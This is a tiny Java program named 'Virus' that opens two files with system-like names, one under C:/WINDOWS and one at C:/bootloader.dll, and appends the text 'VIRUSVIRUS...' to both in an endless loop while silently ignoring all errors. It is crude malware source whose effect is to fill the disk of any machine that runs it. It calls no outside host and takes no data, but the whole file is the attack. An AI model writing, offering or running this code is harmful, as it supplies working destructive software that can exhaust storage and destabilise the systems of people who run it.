import java.io.*; class Virus {  public static void main(String ar[]) {    try {      FileWriter f = new FileWriter("C:/WINDOWS/windows64x32.dll",true);      FileWriter c = new FileWriter("C:/bootloader.dll",true);    while(true) {      f.write("VIRUSVIRUSVIRUSVIRUSVIRUS");      c.write("VIRUSVIRUSVIRUSVIRUSVIRUS");      }    }    catch(FileNotFoundException e){}    catch(IOException e){}  } }